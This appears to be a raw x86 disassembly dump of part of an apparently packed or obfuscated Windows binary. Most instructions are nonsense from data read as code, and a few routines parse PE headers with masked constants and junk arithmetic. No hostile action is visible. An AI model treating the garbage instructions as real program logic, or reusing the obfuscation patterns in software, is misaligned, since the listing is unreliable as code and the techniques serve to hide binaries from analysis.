  40f218:	xchg   BYTE PTR ds:0xfc46e6cd,dl
  40f21e:	inc    ecx
  40f21f:	pop    es
  40f220:	mov    dh,0xb9
  40f222:	mov    bh,0x22
  40f224:	shl    BYTE PTR [edi+0x4d125a19],0x68
  40f22b:	cmp    bh,ch
  40f22d:	div    DWORD PTR [esp+ebx*1-0x68be434c]
  40f234:	mov    eax,ds:0x1cef44d9
  40f239:	cvtps2pd xmm5,QWORD PTR [ecx]
  40f23c:	push   ss
  40f23d:	cmp    ah,BYTE PTR [ebp-0x1754dd86]
  40f243:	(bad)  
  40f244:	sub    edi,DWORD PTR [edx]
  40f246:	cmp    ah,BYTE PTR [ecx]
  40f248:	iret   
  40f249:	mov    DWORD PTR [esi+0x6789c44d],0xe971e58b
  40f253:	push   edx
  40f254:	fdivr  QWORD PTR [edx-0x4c5cc0ff]
  40f25a:	fcos   
  40f25c:	jne    0x40f256
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx+0x388561d9]
  40f282:	cli    
  40f283:	popa   
  40f284:	stos   BYTE PTR es:[edi],al
  40f285:	jl     0x40f303
  40f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f2ab
  40f28c:	in     eax,dx
  40f28d:	int3   
  40f28e:	adc    dl,BYTE PTR [ebx+0x4f468376]
  40f294:	test   DWORD PTR [ecx-0x5b],edx
  40f297:	fidivr WORD PTR [ebx]
  40f299:	ret    0x5915
  40f29c:	mov    esi,0xa3a0d67d
  40f2a1:	outs   dx,DWORD PTR ds:[esi]
  40f2a2:	call   FWORD PTR [eax-0x754eddde]
  40f2a8:	mov    esp,0x30ae1556
  40f2ad:	xor    DWORD PTR [ebx-0x72363e2e],esp
  40f2b3:	shl    BYTE PTR [esi],0x65
  40f2b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2b7:	pop    eax
  40f2b9:	cmp    DWORD PTR [eax+0x1a73ac84],0x87dcfa6
  40f2c3:	leave  
  40f2c4:	pop    edx
  40f2c5:	inc    ecx
  40f2c6:	dec    esi
  40f2c7:	push   ebp
  40f2c8:	inc    edx
  40f2c9:	add    ebp,DWORD PTR cs:[ebx-0x7e2fca39]
  40f2d0:	js     0x40f28e
  40f2d2:	ss aaa 
  40f2d4:	xor    DWORD PTR [edi+0xf],ecx
  40f2d7:	and    esp,edx
  40f2d9:	mov    edx,0x8b377403
  40f2de:	mov    eax,0xeb56e613
  40f2e3:	push   es
  40f2e4:	call   0x864405cf
  40f2e9:	xchg   DWORD PTR [edi],ecx
  40f2eb:	shl    al,0x9d
  40f2ee:	outs   dx,BYTE PTR ds:[esi]
  40f2ef:	xlat   BYTE PTR ds:[ebx]
  40f2f0:	outs   dx,DWORD PTR ds:[esi]
  40f2f1:	inc    ebp
  40f2f2:	pushf  
  40f2f3:	(bad)  
  40f2f4:	aas    
  40f2f5:	loopne 0x40f373
  40f2f7:	push   DWORD PTR gs:[esi]
  40f2fa:	jb     0x40f35b
  40f2fc:	mov    dh,0x2
  40f2fe:	mov    ecx,0x5cefd1f7
  40f303:	cs or  eax,0xf347e21c
  40f309:	sar    BYTE PTR es:[ecx-0x11],cl
  40f30d:	push   0x6
  40f30f:	xchg   ebx,eax
  40f310:	fdivr  st,st(2)
  40f312:	fsub   DWORD PTR [edx-0x6b]
  40f315:	sbb    edi,DWORD PTR [edx+0x1c]
  40f318:	mov    eax,ds:0x597710f0
  40f31d:	pop    esp
  40f31e:	xchg   edx,eax
  40f31f:	xchg   ecx,eax
  40f320:	es into 
  40f322:	jmp    0x74c5:0x51f0a26
  40f329:	xchg   ecx,eax
  40f32a:	jmp    0x40f384
  40f32c:	ret    0x1748
  40f32f:	xchg   edx,eax
  40f330:	dec    ebx
  40f331:	mov    al,ds:0x84ce9c30
  40f336:	mov    edx,0x9d6053b7
  40f33b:	ror    BYTE PTR [eax*4+0x16dc4839],0x15
  40f343:	xlat   BYTE PTR ds:[ebx]
  40f344:	mov    BYTE PTR [ebp+0x5b],ch
  40f347:	out    dx,eax
  40f348:	add    BYTE PTR [ecx],al
  40f34a:	lods   eax,DWORD PTR ds:[esi]
  40f34b:	mov    esp,0x64f1c7ee
  40f350:	pop    ds
  40f351:	out    0x9a,eax
  40f353:	pop    esi
  40f354:	xor    edi,eax
  40f356:	ins    DWORD PTR es:[edi],dx
  40f357:	cmp    DWORD PTR [ecx+0x7eac18dc],esp
  40f35d:	rol    DWORD PTR [ecx],cl
  40f35f:	mov    ecx,0x118b7707
  40f364:	jb     0x40f364
  40f366:	stc    
  40f367:	inc    ebp
  40f368:	mov    cs,esp
  40f36a:	aam    0x7b
  40f36c:	or     ch,BYTE PTR [ebx+0x28179e22]
  40f372:	pop    ds
  40f373:	sahf   
  40f374:	pop    edx
  40f375:	mov    dh,0x19
  40f377:	lsl    eax,WORD PTR [esi+0x24fd8]
  40f37e:	xchg   esi,eax
  40f37f:	out    0x13,al
  40f381:	or     ecx,DWORD PTR [eax+esi*1]
  40f384:	xchg   BYTE PTR [eax-0x15],ah
  40f387:	cwde   
  40f388:	addr16 dec edx
  40f38a:	mov    ebx,0xb7b1bcfc
  40f38f:	repz push ss
  40f391:	gs xor eax,0x19f27a54
  40f397:	add    BYTE PTR [edx+0x44],cl
  40f39a:	or     DWORD PTR [ebp+ebx*1-0x32],ecx
  40f39e:	dec    edi
  40f39f:	cmp    ecx,DWORD PTR [edi]
  40f3a1:	adc    al,0x41
  40f3a3:	es xchg ebp,eax
  40f3a5:	jmp    0xc25a:0xb74a1a76
  40f3ac:	rol    bh,cl
  40f3ae:	xchg   DWORD PTR [ebp-0x11],esi
  40f3b1:	jmp    0x40f406
  40f3b3:	stos   BYTE PTR es:[edi],al
  40f3b4:	xchg   edi,eax
  40f3b5:	dec    edx
  40f3b6:	inc    edi
  40f3b7:	cmp    al,0xae
  40f3b9:	push   0xffffff8e
  40f3bb:	xchg   DWORD PTR [eax-0x53368e11],edi
  40f3c1:	out    0x3c,eax
  40f3c3:	fdiv   DWORD PTR [ebx+ebp*1+0x35]
  40f3c7:	jg     0x40f41b
  40f3c9:	mov    eax,ds:0x51e8a029
  40f3ce:	mov    dl,0xc
  40f3d0:	imul   BYTE PTR [ecx]
  40f3d2:	xor    eax,0x155e5734
  40f3d7:	rol    BYTE PTR [ebx+0x477be1d6],1
  40f3dd:	out    dx,al
  40f3de:	idiv   DWORD PTR [esi+edi*4+0x2682d0b6]
  40f3e5:	mov    ds:0x1703e7e4,eax
  40f3ea:	daa    
  40f3eb:	jmp    0x80d7:0x39a4de02
  40f3f2:	aaa    
  40f3f3:	sar    cl,1
  40f3f5:	sbb    BYTE PTR [edx-0x293a02dc],ah
  40f3fb:	mov    esp,0xb5e751c8
  40f400:	add    bh,BYTE PTR [edx]
  40f402:	pop    edi
  40f403:	nop
  40f404:	or     al,0x4c
  40f406:	repz popf 
  40f408:	jb     0x40f3b3
  40f40a:	in     eax,dx
  40f40b:	mov    edi,0x59842f
  40f410:	enter  0xd2ae,0x95
  40f414:	jbe    0x40f491
  40f416:	jmp    0x40f472
  40f418:	sub    DWORD PTR [ebp+edx*2-0x4415c755],ecx
  40f41f:	inc    esi
  40f420:	xchg   ebp,eax
  40f421:	mov    al,ds:0xac87d43b
  40f426:	sub    DWORD PTR [ebp-0x27],edi
  40f429:	daa    
  40f42a:	(bad)  
  40f42b:	sub    BYTE PTR [esi-0x77e5adbc],cl
  40f431:	xor    DWORD PTR [ebx+esi*8-0xb6de6d3],ebp
  40f438:	test   BYTE PTR [ebp-0x52],dl
  40f43b:	pop    ebp
  40f43c:	loop   0x40f402
  40f43e:	sbb    al,0x67
  40f440:	push   cs
  40f441:	adc    eax,0xecba68eb
  40f446:	jle    0x40f433
  40f448:	inc    esp
  40f44a:	fist   DWORD PTR [eax+0x413d901f]
  40f450:	cdq    
  40f451:	adc    DWORD PTR [edx],edx
  40f453:	(bad)  [ecx-0x77]
  40f456:	loopne 0x40f401
  40f458:	or     al,0xac
  40f45a:	int3   
  40f45b:	shl    BYTE PTR [esp+ebp*2-0x66311f61],1
  40f462:	mov    edi,0xc967d34
  40f467:	neg    DWORD PTR [ebx-0x77]
  40f46a:	hlt    
  40f46b:	jecxz  0x40f45c
  40f46d:	rcr    esi,cl
  40f46f:	test   al,0xf0
  40f471:	les    edi,FWORD PTR [edi-0x22]
  40f474:	xor    eax,0xa3f4e0b9
  40f479:	(bad)
  40f47d:	cld    
  40f47e:	cs into 
  40f480:	cs das 
  40f482:	sub    ebx,ecx
  40f484:	sbb    BYTE PTR [ebp+0x3a],cl
  40f487:	mov    esp,ds
  40f489:	(bad)  
  40f48a:	dec    ebp
  40f48b:	ds je  0x40f45d
  40f48e:	fdivr  QWORD PTR [eax]
  40f490:	mov    BYTE PTR [ebp+0x62],dh
  40f493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f494:	jmp    0x6228:0x3c651b08
  40f49b:	popa   
  40f49c:	loopne 0x40f4c2
  40f49e:	push   cs
  40f49f:	adc    BYTE PTR [ebp-0x534bc572],ah
  40f4a5:	push   DWORD PTR [edx+0x62]
  40f4a8:	mov    dh,0xae
  40f4aa:	cli    
  40f4ab:	std    
  40f4ac:	arpl   di,ax
  40f4ae:	xchg   edx,eax
  40f4af:	out    0x72,eax
  40f4b1:	cld    
  40f4b2:	inc    ecx
  40f4b3:	jne    0x40f489
  40f4b5:	lea    ebp,[ebx+esi*8+0x7a029d0a]
  40f4bc:	lock div BYTE PTR cs:[edx+0x6dbad03c]
  40f4c4:	jmp    0x40f45c
  40f4c6:	mov    esp,0x8f728cd0
  40f4cb:	test   al,0x50
  40f4cd:	xchg   esp,eax
  40f4ce:	dec    ecx
  40f4cf:	in     al,0xf1
  40f4d1:	retf   0x5f64
  40f4d4:	cmp    al,0xfb
  40f4d6:	xlat   BYTE PTR ds:[ebx]
  40f4d7:	loop   0x40f522
  40f4d9:	fimul  DWORD PTR [edi-0x27922ef7]
  40f4df:	xor    ch,ah
  40f4e1:	xchg   BYTE PTR [ecx-0x28c9b0cc],ah
  40f4e7:	out    dx,al
  40f4e8:	jo     0x40f48a
  40f4ea:	jne    0x40f499
  40f4ec:	and    DWORD PTR [ebx],esi
  40f4ee:	(bad)  
  40f4ef:	(bad)  
  40f4f0:	mov    ds:0xcc81710d,eax
  40f4f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4f6:	fidivr WORD PTR [edi-0x13]
  40f4f9:	pop    edx
  40f4fa:	sbb    eax,0xb0ff699b
  40f4ff:	push   ecx
  40f500:	inc    eax
  40f501:	xchg   ecx,eax
  40f502:	adc    al,0x60
  40f504:	imul   edx,DWORD PTR [ebp+edx*4-0x78],0x1ab45392
  40f50c:	add    BYTE PTR ds:[edx+0x6157a30d],ah
  40f513:	fbstp  TBYTE PTR [edi+0x4366c16d]
  40f519:	add    al,0x21
  40f51b:	add    BYTE PTR [esi-0x2e],0x52
  40f51f:	jge    0x40f4df
  40f521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f522:	mov    bl,0x8f
  40f524:	mov    eax,ds:0x9df5968b
  40f529:	dec    DWORD PTR [ebx]
  40f52b:	mov    al,ds:0x4791dc6e
  40f530:	sbb    BYTE PTR [ecx],al
  40f532:	sbb    al,0x60
  40f534:	arpl   WORD PTR [ebx],bx
  40f536:	lds    ebp,FWORD PTR [ebx]
  40f538:	pop    edi
  40f539:	pop    es
  40f53a:	push   ss
  40f53b:	addr16 and eax,0x2b064c29
  40f541:	pop    edi
  40f542:	mov    ah,bl
  40f544:	(bad)
  40f548:	cdq    
  40f549:	and    al,0xb2
  40f54b:	or     BYTE PTR [eax],al
  40f54d:	out    0xe0,eax
  40f54f:	dec    edi
  40f550:	pop    ecx
  40f551:	dec    ah
  40f553:	jbe    0x40f52e
  40f555:	jl     0x40f511
  40f557:	in     eax,0xec
  40f559:	push   ss
  40f55a:	cmp    eax,0x7ac62b22
  40f55f:	cwde   
  40f560:	push   0xffffffb1
  40f562:	sbb    DWORD PTR [ecx-0x4],esi
  40f565:	sbb    edx,DWORD PTR [esi+esi*1]
  40f568:	push   ebp
  40f569:	mov    dh,0x2a
  40f56b:	ret    0x8119
  40f56e:	lods   al,BYTE PTR ds:[esi]
  40f56f:	(bad)  
  40f570:	pop    esp
  40f571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f572:	in     al,dx
  40f573:	mov    bh,0xc0
  40f575:	lock ja 0x40f51c
  40f578:	pusha  
  40f579:	(bad)  
  40f57a:	jge    0x40f5c9
  40f57c:	fxtract 
  40f57e:	sub    edx,DWORD PTR [ebx]
  40f580:	dec    esi
  40f581:	mov    WORD PTR [edx+0x737e372f],ds
  40f587:	jmp    0x40f5f4
  40f589:	xor    ebx,esi
  40f58b:	push   0x6a452f80
  40f590:	adc    BYTE PTR [ebx+0x4e],ch
  40f593:	mov    eax,es
  40f595:	fcmovnbe st,st(6)
  40f597:	adc    eax,DWORD PTR [ebx+esi*2+0x2]
  40f59b:	cli    
  40f59c:	shl    DWORD PTR [eax+0x33fefde1],cl
  40f5a2:	jae    0x40f555
  40f5a4:	int    0x4d
  40f5a6:	leave  
  40f5a7:	inc    ebp
  40f5a8:	xchg   BYTE PTR [ebp-0x11],dh
  40f5ab:	hlt    
  40f5ac:	out    0x60,eax
  40f5ae:	sbb    al,BYTE PTR [esi+ebp*1-0x17]
  40f5b2:	push   es
  40f5b3:	outs   dx,DWORD PTR ds:[esi]
  40f5b4:	out    0xb5,al
  40f5b6:	dec    ebp
  40f5b7:	jmp    0x40f5f0
  40f5b9:	ins    BYTE PTR es:[edi],dx
  40f5ba:	in     al,dx
  40f5bb:	mov    cl,0xbc
  40f5bd:	add    eax,0x73a506b3
  40f5c2:	mov    eax,ds:0xf1dbd68a
  40f5c7:	(bad)  
  40f5c8:	jno    0x40f5ad
  40f5ca:	nop
  40f5cb:	add    BYTE PTR [ebx+0xd],bh
  40f5ce:	out    0xeb,eax
  40f5d0:	cwde   
  40f5d1:	push   0x5228d33b
  40f5d6:	pop    ds
  40f5d7:	mov    esp,0x74942a50
  40f5dc:	int    0x4b
  40f5de:	adc    DWORD PTR [esi-0x7],0x3f5c9a32
  40f5e5:	dec    esp
  40f5e6:	inc    edi
  40f5e7:	sub    DWORD PTR [esi],0xe30e31a0
  40f5ed:	mov    ds:0xca5aa8e6,eax
  40f5f2:	sbb    DWORD PTR [ebx+0x42b038ec],0xda50ccc2
  40f5fc:	inc    edi
  40f5fd:	scas   al,BYTE PTR es:[edi]
  40f5fe:	dec    eax
  40f5ff:	call   0xe2b4:0x26d4ec97
  40f606:	jmp    0x40f5ff
  40f608:	mov    WORD PTR [esi-0x2f],es
  40f60b:	(bad)  
  40f60c:	push   0x96ba79c5
  40f611:	xchg   DWORD PTR [ecx+0x49],ebx
  40f614:	ins    BYTE PTR es:[edi],dx
  40f615:	imul   ebx,DWORD PTR [ebp-0x4339c06d],0x4050e462
  40f61f:	jge    0x40f5c5
  40f621:	jae    0x40f5f3
  40f623:	jb     0x40f640
  40f625:	ror    BYTE PTR [ecx+ecx*4],1
  40f628:	fld    TBYTE PTR [edi-0x16]
  40f62b:	jns    0x40f60e
  40f62d:	xchg   DWORD PTR [esi],ebx
  40f62f:	les    eax,FWORD PTR [ecx+0x5e3904ae]
  40f635:	leave  
  40f636:	ret    0xc
  40f639:	push   ebp
  40f63a:	mov    ebp,esp
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x4336ef,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x4336df,0x4336a3
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0xe4b33c9f
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0x617c7c7e
  40f67b:	mov    ds:0x5cbc8337,eax
  40f680:	and    DWORD PTR [esp+edx*4-0x44],eax
  40f684:	adc    DWORD PTR [ecx],edx
  40f686:	lahf   
  40f687:	pop    edi
  40f688:	sbb    DWORD PTR [edi],esp
  40f68a:	pop    esp
  40f68b:	cmp    bl,dh
  40f68d:	lock sub eax,0x40775f48
  40f693:	xchg   esi,eax
  40f694:	bndldx bnd1,[edi]
  40f697:	mov    ebp,0x4290be96
  40f69c:	adc    BYTE PTR [edx-0x12cb07c],al
  40f6a2:	into   
  40f6a3:	aas    
  40f6a4:	das    
  40f6a5:	out    dx,eax
  40f6a6:	enter  0xd170,0x61
  40f6aa:	xor    DWORD PTR [eax+eiz*8-0x352f6f91],edx
  40f6b1:	xchg   ebx,eax
  40f6b2:	out    0x3c,eax
  40f6b4:	jnp    0x40f678
  40f6b6:	ret    
  40f6b7:	fldcw  WORD PTR [eax]
  40f6b9:	cmp    esi,0x16eb3966
  40f6bf:	mov    bh,0x5e
  40f6c1:	jo     0x40f69c
  40f6c3:	test   esi,eax
  40f6c5:	adc    BYTE PTR [ecx-0xf46fe7e],bl
  40f6cb:	dec    esp
  40f6cc:	mov    ds:0xc11e9a0f,eax
  40f6d1:	add    ch,bl
  40f6d3:	mov    al,ds:0xe81ec7bf
  40f6d8:	gs std 
  40f6da:	ins    BYTE PTR es:[edi],dx
  40f6db:	ror    DWORD PTR [ebx],1
  40f6dd:	sub    dl,BYTE PTR [edx]
  40f6df:	cmp    DWORD PTR [esp+edi*2+0x7b],ebp
  40f6e3:	pop    ebx
  40f6e4:	data16 ja 0x40f688
  40f6e7:	imul   eax,ebx,0x9c78b602
  40f6ed:	iret   
  40f6ee:	cmovp  ebx,DWORD PTR [esi+0x58]
  40f6f2:	pop    edi
  40f6f3:	aam    0x93
  40f6f5:	outs   dx,DWORD PTR ds:[esi]
  40f6f6:	sub    DWORD PTR [ecx-0x18],esi
  40f6f9:	(bad)  
  40f6fa:	jbe    0x40f681
  40f6fc:	push   eax
  40f6fd:	jp     0x40f727
  40f6ff:	cmc    
  40f700:	jno    0x40f780
  40f702:	xor    eax,0x40a2c19e
  40f707:	dec    ebx
  40f708:	aad    0x2
  40f70a:	stos   BYTE PTR es:[edi],al
  40f70b:	lahf   
  40f70c:	jl     0x40f741
  40f70e:	push   edi
  40f70f:	stos   DWORD PTR es:[edi],eax
  40f710:	mov    edi,0x68d4af30
  40f715:	neg    BYTE PTR [edi+0x51]
  40f718:	shr    DWORD PTR [esi-0x76faf2eb],1
  40f71e:	shl    DWORD PTR [esi-0x1e],1
  40f721:	pop    ecx
  40f722:	retf   
  40f723:	inc    edx
  40f724:	jno    0x40f716
  40f726:	pusha  
  40f727:	daa    
  40f728:	sub    DWORD PTR [ecx],eax
  40f72a:	pop    edi
  40f72b:	xchg   esp,eax
  40f72c:	dec    esi
  40f72d:	add    ebp,ebx
  40f72f:	dec    ecx
  40f730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f731:	cmp    DWORD PTR [ebx],ebp
  40f733:	xchg   edi,eax
  40f734:	or     al,0x76
  40f736:	mov    DWORD PTR [ecx],edi
  40f738:	jb     0x40f762
  40f73a:	scas   al,BYTE PTR es:[edi]
  40f73b:	mov    esi,0xd2cfbe48
  40f740:	ins    BYTE PTR es:[edi],dx
  40f741:	stos   DWORD PTR es:[edi],eax
  40f742:	bound  eax,QWORD PTR [eax+0x7]
  40f745:	push   DWORD PTR [edx+eax*1]
  40f748:	lds    edi,FWORD PTR [edi-0x34]
  40f74b:	jmp    0x40f759
  40f74d:	ja     0x40f73f
  40f74f:	mov    dl,0x85
  40f751:	call   0x7968:0x56b53c48
  40f758:	sbb    ebp,edx
  40f75a:	loope  0x40f770
  40f75c:	stos   BYTE PTR es:[edi],al
  40f75d:	push   es
  40f75e:	jecxz  0x40f72a
  40f760:	add    al,0xfe
  40f762:	(bad)  
  40f763:	mov    dl,0xf7
  40f765:	sahf   
  40f766:	mov    dh,0x56
  40f768:	(bad)  
  40f76a:	not    BYTE PTR [ebx+0x40]
  40f76d:	in     eax,dx
  40f76e:	adc    DWORD PTR [ecx+0x5e],ebx
  40f771:	dec    esi
  40f772:	xor    BYTE PTR [eax+ebx*8],ch
  40f775:	dec    ebp
  40f776:	push   esi
  40f777:	xchg   ebp,eax
  40f778:	xchg   esi,eax
  40f779:	jae    0x40f70a
  40f77b:	push   esi
  40f77c:	inc    edi
  40f77d:	in     eax,dx
  40f77e:	cli    
  40f77f:	ins    DWORD PTR es:[edi],dx
  40f780:	lock and BYTE PTR [esi+0xde34bb2],0x94
  40f788:	jmp    DWORD PTR [eax]
  40f78a:	sbb    al,0x50
  40f78c:	in     eax,dx
  40f78d:	test   eax,0x5d4261a7
  40f792:	(bad)  
  40f793:	fs mov edi,0x84392d0c
  40f799:	cli    
  40f79a:	out    0x6b,eax
  40f79c:	ds scas al,BYTE PTR es:[edi]
  40f79e:	push   0x6434ae34
  40f7a3:	int    0x42
  40f7a5:	jp     0x40f817
  40f7a7:	ins    DWORD PTR es:[edi],dx
  40f7a8:	pop    es
  40f7a9:	xlat   BYTE PTR ds:[ebx]
  40f7aa:	lea    ebp,[ebx+0x3020a63]
  40f7b0:	(bad)
  40f7b3:	mov    DWORD PTR [esi-0x29c9bb33],eax
  40f7b9:	aas    
  40f7ba:	into   
  40f7bb:	dec    ebx
  40f7bc:	cdq    
  40f7bd:	clc    
  40f7be:	scas   eax,DWORD PTR es:[edi]
  40f7bf:	push   ecx
  40f7c0:	push   eax
  40f7c1:	dec    eax
  40f7c2:	or     ebx,esp
  40f7c4:	adc    DWORD PTR [ecx],edx
  40f7c6:	aam    0xae
  40f7c8:	mov    WORD PTR [eax+0x4e8ecfeb],?
  40f7ce:	jno    0x40f81d
  40f7d0:	(bad)  
  40f7d2:	imul   edx,DWORD PTR [edx+0xd],0xffffffaf
  40f7d6:	aad    0x9c
  40f7d8:	popa   
  40f7d9:	jmp    0x7509:0x4bc0f2a4
  40f7e0:	aad    0x74
  40f7e2:	ins    BYTE PTR es:[edi],dx
  40f7e3:	addr16 fwait
  40f7e5:	ret    0x77bf
  40f7e8:	test   eax,0x5d871a3f
  40f7ed:	inc    ecx
  40f7ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7ef:	in     eax,0x99
  40f7f1:	test   eax,0xf7324262
  40f7f6:	sbb    ebp,0x4
  40f7f9:	lods   eax,DWORD PTR ds:[esi]
  40f7fa:	push   ecx
  40f7fb:	inc    eax
  40f7fc:	leave  
  40f7fd:	sub    ecx,DWORD PTR [edx-0x7d]
  40f800:	fld    QWORD PTR [edx-0x39ed2661]
  40f806:	xchg   edi,eax
  40f807:	sbb    dl,dh
  40f809:	push   esp
  40f80a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f80b:	cdq    
  40f80c:	scas   al,BYTE PTR es:[edi]
  40f80d:	jp     0x40f86e
  40f80f:	jge    0x40f860
  40f811:	jge    0x40f82f
  40f813:	fdiv   QWORD PTR [edx-0x1f1d4209]
  40f819:	outs   dx,BYTE PTR ds:[esi]
  40f81a:	icebp  
  40f81b:	push   0x2a
  40f81d:	scas   eax,DWORD PTR es:[edi]
  40f81e:	loopne 0x40f864
  40f820:	cdq    
  40f821:	mov    ecx,0x94d36d0c
  40f826:	or     al,al
  40f828:	xchg   ebp,eax
  40f829:	das    
  40f82a:	push   0xb4ac5e71
  40f82f:	inc    edx
  40f830:	ss xor al,0xe0
  40f833:	(bad)
  40f837:	call   0xd1478be3
  40f83c:	xchg   DWORD PTR [esi-0x34],ebx
  40f83f:	add    edi,DWORD PTR [esi-0x1341d53]
  40f845:	aad    0xee
  40f847:	jmp    0xf9a7:0x9a131df2
  40f84e:	std    
  40f84f:	es jmp 0x3a67:0x3b0e829b
  40f857:	cld    
  40f858:	test   al,0x32
  40f85a:	jno    0x40f881
  40f85c:	rcl    ebx,cl
  40f85e:	leave  
  40f85f:	fimul  DWORD PTR ds:0xcd58979
  40f865:	ror    ebx,1
  40f867:	dec    ebx
  40f868:	mov    esi,0x9e06555d
  40f86d:	gs aas 
  40f86f:	cmp    cl,ch
  40f871:	imul   ecx,DWORD PTR [ecx-0x758528d4],0x66
  40f878:	sub    eax,0xd7b0df66
  40f87d:	cmp    BYTE PTR ds:0xd5a9000c,ah
  40f883:	fimul  DWORD PTR [ecx]
  40f885:	mov    ds,ebp
  40f887:	cld    
  40f888:	aaa    
  40f889:	adc    eax,0x6acf93a9
  40f88e:	out    dx,al
  40f88f:	xor    edx,ebp
  40f891:	cmp    BYTE PTR [ebp-0x1e3d9dbb],ah
  40f897:	adc    eax,0x380e6159
  40f89c:	rol    DWORD PTR [edi+0x4534ad93],0xb
  40f8a3:	call   0xe0301263
  40f8a8:	ins    DWORD PTR es:[edi],dx
  40f8a9:	in     al,0x32
  40f8ab:	jmp    0x40f8eb
  40f8ad:	sbb    eax,0x86ece145
  40f8b2:	xor    DWORD PTR [edi],0xffffffea
  40f8b5:	(bad)  
  40f8b6:	mov    esp,fs
  40f8b8:	test   eax,0x4408f114
  40f8bd:	push   esp
  40f8be:	push   edx
  40f8bf:	lahf   
  40f8c0:	xchg   DWORD PTR [ebx],ebx
  40f8c2:	sti    
  40f8c3:	out    dx,eax
  40f8c4:	sbb    ebx,DWORD PTR [ebx+0x72d55c6]
  40f8ca:	sbb    BYTE PTR [ebx],ah
  40f8cc:	pusha  
  40f8cd:	(bad)  
  40f8ce:	dec    ebx
  40f8cf:	outs   dx,BYTE PTR ds:[esi]
  40f8d0:	dec    eax
  40f8d1:	sub    eax,0x4ca023d3
  40f8d6:	call   0xae72:0x41c47216
  40f8dd:	xchg   edi,eax
  40f8de:	or     eax,0xbdcf329b
  40f8e3:	call   0xb8558d83
  40f8e8:	mov    esp,0xea3d6cea
  40f8ed:	pushf  
  40f8ee:	ret    0x6f7e
  40f8f1:	ret    
  40f8f2:	cli    
  40f8f3:	loopne 0x40f901
  40f8f5:	sub    DWORD PTR [esi-0x182c58e6],eax
  40f8fb:	mov    bl,0x3
  40f8fd:	aaa    
  40f8fe:	jmp    0x40f8fe
  40f900:	hlt    
  40f901:	cmp    bh,BYTE PTR [edx]
  40f903:	mov    bl,0xa0
  40f905:	ret    
  40f906:	loope  0x40f897
  40f908:	pop    esp
  40f909:	mov    WORD PTR [edi+0x3c],ds
  40f90c:	sbb    eax,0x8c746465
  40f911:	stos   BYTE PTR es:[edi],al
  40f912:	mov    esp,0xc90d358e
  40f917:	mov    ecx,0x78cda0de
  40f91c:	adc    ebp,DWORD PTR [ecx]
  40f91e:	xchg   BYTE PTR ds:0xc70c7b7,cl
  40f924:	nop
  40f925:	add    al,0x39
  40f927:	and    DWORD PTR ds:0x43372b,0x4336a7
  40f931:	xor    al,0x45
  40f933:	cmp    al,0xc3
  40f935:	jne    0x40f9bc
  40f93b:	adc    ecx,edx
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x43365f
  40f947:	add    DWORD PTR ds:0x433647,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x43372f,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433717,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x4336a7
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x433763
  40f97f:	adc    ecx,DWORD PTR ds:0x4336ab
  40f985:	mov    DWORD PTR ds:0x433763,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x4336b3,0x4336af
  40f9e3:	xor    ecx,eax
  40f9e5:	add    DWORD PTR ds:0x433723,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433697,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
